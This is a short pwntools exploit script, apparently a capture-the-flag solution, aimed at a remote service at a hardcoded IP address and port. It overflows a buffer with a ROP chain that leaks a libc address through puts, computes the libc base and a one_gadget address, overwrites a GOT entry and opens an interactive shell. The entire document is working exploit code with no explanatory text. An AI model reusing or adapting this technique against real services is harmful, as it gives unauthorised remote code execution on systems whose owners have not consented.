from pwn import *

#p=process('./s')
p=remote('82.196.10.106',58399)
e=ELF('./s')

puts_got=e.got['puts']
puts_plt=e.plt['puts']
strcpy_got=e.got['strcpy']
scanf_plt=e.plt['__isoc99_scanf']

pr=0x0000000000401bab
sid=str(790317143)
nick='DreadPirateRoberts'+'1'+'\x69\x7a\x00'

p.sendafter('ID',sid)
p.sendafter('nick',nick)

pay="A"*0x40+p64(strcpy_got+0x40)
pay+=p64(pr)+p64(puts_got)+p64(puts_plt)
pay+=p64(0x4018a6)

p.recvuntil('road!\n')
p.sendline(pay)

leak=u64(p.recvline()[:-1]+'\x00'*2)
lb=leak-0x809c0
success(hex(lb))
system=lb+0x4f440
one=lb+0x10a38c

pay=p64(one)
p.sendline(pay)

p.interactive()
